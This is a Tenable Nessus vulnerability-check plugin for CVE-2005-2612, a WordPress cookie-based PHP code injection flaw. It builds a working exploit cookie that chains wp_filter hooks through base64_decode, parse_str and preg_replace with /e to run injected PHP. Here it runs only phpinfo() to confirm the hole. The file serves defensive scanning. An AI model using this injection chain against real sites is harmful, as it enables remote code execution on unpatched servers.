#
# (C) Tenable Network Security
#


if (description) {
  script_id(19414);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2612");
  script_bugtraq_id(14533);
  script_xref(name:"OSVDB", value:"18672");

  name["english"] = "WordPress cache_lastpostdate Parameter PHP Code Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis : 

The remote web server contains a PHP script that is prone to PHP code
injection. 

Description :

The installed version of WordPress on the remote host will accept and
execute arbitrary PHP code passed to the 'cache_lastpostdate'
parameter via cookies provided PHP's 'register_globals' setting is
enabled. 

See also : 

http://www.nessus.org/u?2c5481e5

Solution : 

Disable PHP's 'register_globals' setting. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for cache_lastpostdate parameter PHP code injection vulnerability in WordPress";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Construct an exploit per PoC.
  #
  # nb: hardcoding the final value of 'cnv' would save time but not
  #     be as understandable.
  cmd = "phpinfo();";
  code = base64(str:cmd);
  for (i=0; i<strlen(code); i++) {
    cnv += string("chr(", ord(code[i]), ").");
  }
  cnv += string("chr(32)");
  str = base64(
    str:string(
      "args[0]=eval(base64_decode(", cnv, ")).die()&",
      "args[1]=x"
    )
  );

  exploit = string(
    "wp_filter[query_vars][0][0][function]=get_lastpostdate;",
    "wp_filter[query_vars][0][0][accepted_args]=0;",
    "wp_filter[query_vars][0][1][function]=base64_decode;",
    "wp_filter[query_vars][0][1][accepted_args]=1;",
    "cache_lastpostmodified[server]=//e;",
    "cache_lastpostdate[server]=", str, ";",
    "wp_filter[query_vars][1][0][function]=parse_str;",
    "wp_filter[query_vars][1][0][accepted_args]=1;",
    "wp_filter[query_vars][2][0][function]=get_lastpostmodified;",
    "wp_filter[query_vars][2][0][accepted_args]=0;",
    "wp_filter[query_vars][3][0][function]=preg_replace;",
    "wp_filter[query_vars][3][0][accepted_args]=3"
  );

  # Try to exploit one of the flaws to run phpinfo().
  req = http_get(item:string(dir, "/"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: ", exploit, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like the output of phpinfo().
  if ("PHP Version" >< res) {
    security_warning(port);
    exit(0);
  }
}
